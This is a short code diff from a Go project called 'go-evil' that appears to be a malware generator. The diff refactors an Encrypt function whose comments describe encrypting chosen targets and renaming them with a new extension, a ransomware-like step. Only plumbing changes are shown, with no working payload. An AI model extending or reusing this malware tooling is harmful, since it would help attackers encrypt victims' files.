@@ -3,22 +3,20 @@ package encrypt
 import (
 	"fmt"
 
-	"github.com/TeamPhoneix/go-evil/utility/structure"
 	"github.com/TeamPhoneix/go-evil/utility/structure/functions"
+	"github.com/TeamPhoneix/go-evil/utility/structure/json"
 )
 
 // Encrypts the provided target
 // The input can follow this format '${"<crypto system>", "<key length>", "<key>", "<new extension>" , "target_1", "target_2", ... "target_N"}$'
 // following the above format will "overwrite" all values in the struct before encrypting
 // The struct meaning the internal malware crypt struct
-func Encrypt(value string, s_json string) ([]string, string) {
-	data_object := structure.Receive(s_json)
+func Encrypt(value string, data_object *json.Json_t) []string {
 
 	function_call := "encrypt"
 	call_history := []string{}
 	if value != "" {
-		call_history, s_json = preface_configuration(value, s_json)
-		data_object = structure.Receive(s_json) // Update our structure
+		call_history = preface_configuration(value, data_object)
 	}
 
 	data_object.Add_go_function(functions.Go_func_t{Name: function_call, Func_type: "", Part_of_struct: "", Return_type: "",
@@ -81,5 +79,5 @@ func Encrypt(value string, s_json string) ([]string, string) {
 
 	call_history = append(call_history, fmt.Sprintf("%s()", function_call))
 
-	return call_history, structure.Send(data_object)
+	return call_history
 }
